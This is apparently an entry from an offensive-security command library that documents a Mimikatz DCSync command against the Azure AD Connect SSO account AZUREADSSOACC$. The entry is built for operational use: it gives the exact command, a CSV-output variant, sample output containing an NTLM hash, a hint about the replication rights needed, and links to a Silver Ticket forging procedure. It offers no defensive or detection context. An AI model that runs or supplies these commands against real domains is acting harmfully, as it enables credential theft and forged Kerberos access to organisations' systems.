---
id: 027a7432-605b-498f-bc29-034b3b33c747
name: mimikatz-dcsync-azureadss oacc
type: command
executor: cmd
data: 'mimikatz.exe "lsadump::dcsync /user:AZUREADSSOACC$" exit'
output: null
created_at: '2023-04-06T03:56:16.175344+00:00'
updated_at: '2023-04-10T20:19:22.599013+00:00'
platforms:
  - Windows
tags:
  - dcsync
  - credential-access
  - azure-ad
verified: true
validated: true
---

# mimikatz-dcsync-azureadss oacc

## Command

```cmd
mimikatz.exe "lsadump::dcsync /user:AZUREADSSOACC$" exit
```

## Description

This command uses Mimikatz to perform a DCSync operation specifically targeting the AZUREADSSOACC$ computer account in an Active Directory domain, extracting its NTLM password hash for use in Kerberos ticket forging attacks like Silver Tickets in Azure AD Connect environments.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| /user:AZUREADSSOACC$ | Specifies the target account (Azure AD Connect SSO computer account) for hash extraction | Yes |
| lsadump::dcsync | Mimikatz module for replicating directory data like a domain controller | Built-in |
| exit | Closes Mimikatz after execution | No |

## Examples

### Basic Usage

```cmd
mimikatz.exe "lsadump::dcsync /user:AZUREADSSOACC$" exit
```

### Advanced Usage

```cmd
mimikatz.exe "lsadump::dcsync /user:AZUREADSSOACC$ /csv" exit
```

(Adds CSV output format for easier parsing of the hash.)

## Expected Output

Successful execution displays directory replication details, including the NTLM hash:

[output]
User : AZUREADSSOACC$
...
Hash NTLM: f9969e088b2c13d93833d0ce436c76dd

If access is denied, check privileges (requires replication rights).

## Related

- [[procedures/Azure-AD-Connect-Silver-Ticket-Attack]]
- [[commands/mimikatz-kerberos-silver-ticket-aadg]]
